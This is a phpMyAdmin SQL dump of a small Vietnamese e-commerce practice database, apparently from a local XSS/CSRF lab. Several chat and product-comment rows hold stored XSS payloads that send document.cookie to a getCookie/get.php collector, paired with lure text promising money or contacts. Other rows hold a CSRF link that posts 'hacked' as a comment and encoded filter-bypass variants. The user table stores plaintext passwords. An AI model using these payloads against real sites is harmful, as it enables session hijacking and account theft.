-- phpMyAdmin SQL Dump
-- version 5.2.0
-- https://www.phpmyadmin.net/
--
-- Máy chủ: 127.0.0.1
-- Thời gian đã tạo: Th5 04, 2023 lúc 04:32 PM
-- Phiên bản máy phục vụ: 10.4.27-MariaDB
-- Phiên bản PHP: 8.2.0

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Cơ sở dữ liệu: `webbanhang`
--

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `carts`
--

CREATE TABLE `carts` (
  `cart_id` int(11) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `product_name` varchar(50) DEFAULT NULL,
  `product_id` int(11) DEFAULT NULL,
  `price` float DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `chat`
--

CREATE TABLE `chat` (
  `id` int(11) NOT NULL,
  `from_user` varchar(11) NOT NULL,
  `to_user` varchar(11) NOT NULL,
  `message` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Đang đổ dữ liệu cho bảng `chat`
--

INSERT INTO `chat` (`id`, `from_user`, `to_user`, `message`) VALUES
(11, 'Trung', 'Chuc', 'helllo'),
(12, 'Trung', 'Chuc', 'ok'),
(13, 'Trung', 'Chuc', 'hellloo'),
(16, 'Chuc', 'Trung', 'Bú Bú'),
(30, 'Trung', 'Hieu', 'e cu'),
(31, 'Trung', 'Hieu', '<a href=# onclick=\"document.location=\'../getCookie/get.php?cookie=\'+escape(document.cookie);\">Click vào để lấy 1 củ</a>'),
(32, 'Trung', 'Chuc', '<a href=# onclick=\"document.location=\'../getCookie/get.php?cookie=\'+escape(document.cookie);\">Click vào để lấy 1 củ</a>'),
(33, 'Trung', 'truong', '<a href=# onclick=\"document.location=\'../getCookie/get.php?cookie=\'+escape(document.cookie);\">Click vào để lấy 1 củ</a>'),
(42, 'Chuc', 'Trung', 'ê'),
(70, 'Hieu', 'Trung', 'Link gì đấy'),
(71, 'Chuc', 'Hieu', '<a href=# onclick=\"document.location=\'../getCookie/get.php?cookie=\'+escape(document.cookie);\">Click vào để nhận 1tr</a>'),
(72, 'Hieu', 'Chuc', 'Cái gì đấy'),
(73, 'Chuc', 'Hieu', 'Ấn vào đi , được 1tr đấy'),
(83, 'Chuc', 'truong', 'ê'),
(85, 'truong', 'Chuc', 'Gì đấy'),
(86, 'Chuc', 'truong', '<a href=\"\" onclick=\"document.location=\'../getCookie/get.php?cookie=\'+escape(document.cookie);\">     <img src=\"../../images/gai.jpg\" witdh=\"150px\" height=\"150px\"> <br>Click để lấy contact </a>'),
(95, 'Trung', 'Hieu', '<a href=\"http://localhost/Webs/Comment/post_comment.php?comment=hacked\">Click để nhận thưởng</a>'),
(96, 'Trung', 'Hieu', 'Bấm vào đi'),
(97, 'Hieu', 'Trung', 'Cái gì đấy'),
(99, 'Trung', 'Hieu', '<a href=\"../Comment/post_comment.php?comment=hacked\">Click để nhận thưởng</a>');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `comments`
--

CREATE TABLE `comments` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `comment` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Đang đổ dữ liệu cho bảng `comments`
--

INSERT INTO `comments` (`id`, `name`, `comment`) VALUES
(30, 'Trung', 'Hôm này là ngày đầu tuần\r\n'),
(31, 'Chuc', 'Trung Flexible'),
(36, 'Hieu', 'Hiếu Hj Bj'),
(80, 'Trung', 'Hôm nay là thứ 6\r\n'),
(86, 'Trung', 'aaaa'),
(121, 'Hieu', 'hacked'),
(122, 'Trung', 'a');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `commentsp`
--

CREATE TABLE `commentsp` (
  `id` int(11) NOT NULL,
  `product_id` int(11) NOT NULL,
  `user_name` varchar(255) NOT NULL,
  `comment_text` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Đang đổ dữ liệu cho bảng `commentsp`
--

INSERT INTO `commentsp` (`id`, `product_id`, `user_name`, `comment_text`) VALUES
(3, 8, 'Trung', 'Trung'),
(17, 14, 'Trung', 'aaaaa'),
(23, 1, 'Chuc', 'aa'),
(27, 1, 'Trung', 'ok'),
(58, 2, 'Trung', 'e'),
(69, 1, 'Trung', '<script> alert(\"Hacked\");var img = new Image(); img.src = \"http://localhost/Webs/getCookie/get.php?cookie=\" + document.cookie; </script>'),
(74, 3, 'a', 'ltscriptgtalertquotHackedquotvarimgnewImageimgsrcquothttplocalhostWebsgetCookiegetphpcookiequotdocumentcookieltscriptgt'),
(75, 3, 'c', 'ltscltsCriPtgtriptgtalert1ltscrltSCRIPTgtiptgt'),
(77, 4, '1', 'xf7su9ov'),
(78, 13, '1', 'xf7su9ov');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `products`
--

CREATE TABLE `products` (
  `id` int(11) NOT NULL,
  `name` varchar(20) NOT NULL,
  `price` decimal(10,2) NOT NULL,
  `image_url` varchar(50) DEFAULT NULL,
  `type_product` varchar(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Đang đổ dữ liệu cho bảng `products`
--

INSERT INTO `products` (`id`, `name`, `price`, `image_url`, `type_product`) VALUES
(1, 'Màn Hình Acer', '5555.00', '/images/acer1.jpg', 'ManHinh'),
(2, 'Đồng Hồ 1', '555.00', '/images/DH1.jpg', 'DongHo'),
(3, 'Đồng Hồ 2', '555.00', '/images/DH2.jpg', 'DongHo'),
(4, 'Đồng Hồ 3', '555.00', '/images/DH3.jpg', 'DongHo'),
(5, 'Loa 1', '555.00', '/images/Loa1.jpg', 'Loa'),
(6, 'Loa 2', '555.00', '/images/Loa2.jpg', 'Loa'),
(7, 'Loa 3', '555.00', '/images/Loa3.jpg', 'Loa'),
(8, 'Loa 4', '55555.00', '/images/Loa4.jpg', 'Loa'),
(12, 'Màn Hình', '555.00', '/images/LG1-1.jpg', 'ManHinh'),
(13, 'Màn Hình Asus', '555.00', '/images/asus.jpg', 'ManHinh'),
(14, 'Màn Hình Asus', '555.00', '/images/asus1.jpg', 'ManHinh');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `user`
--

CREATE TABLE `user` (
  `UserName` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `PassWord` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `Admin` int(11) DEFAULT NULL,
  `Email` varchar(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Đang đổ dữ liệu cho bảng `user`
--

INSERT INTO `user` (`UserName`, `PassWord`, `Admin`, `Email`) VALUES
('Chuc', '2510', 0, 'Chuc@gmail.com'),
('Trung', '2510', 1, 'Trung@gmail.com'),
('truong', '2510', 0, 'truong@gmail.com'),
('Hieu', '2510', 0, 'Hieu123@gmail.com');

--
-- Chỉ mục cho các bảng đã đổ
--

--
-- Chỉ mục cho bảng `carts`
--
ALTER TABLE `carts`
  ADD PRIMARY KEY (`cart_id`);

--
-- Chỉ mục cho bảng `chat`
--
ALTER TABLE `chat`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `comments`
--
ALTER TABLE `comments`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `commentsp`
--
ALTER TABLE `commentsp`
  ADD PRIMARY KEY (`id`),
  ADD KEY `product_id` (`product_id`);

--
-- Chỉ mục cho bảng `products`
--
ALTER TABLE `products`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT cho các bảng đã đổ
--

--
-- AUTO_INCREMENT cho bảng `chat`
--
ALTER TABLE `chat`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=100;

--
-- AUTO_INCREMENT cho bảng `comments`
--
ALTER TABLE `comments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=123;

--
-- AUTO_INCREMENT cho bảng `commentsp`
--
ALTER TABLE `commentsp`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=79;

--
-- AUTO_INCREMENT cho bảng `products`
--
ALTER TABLE `products`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- Các ràng buộc cho các bảng đã đổ
--

--
-- Các ràng buộc cho bảng `commentsp`
--
ALTER TABLE `commentsp`
  ADD CONSTRAINT `commentsp_ibfk_1` FOREIGN KEY (`product_id`) REFERENCES `products` (`id`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
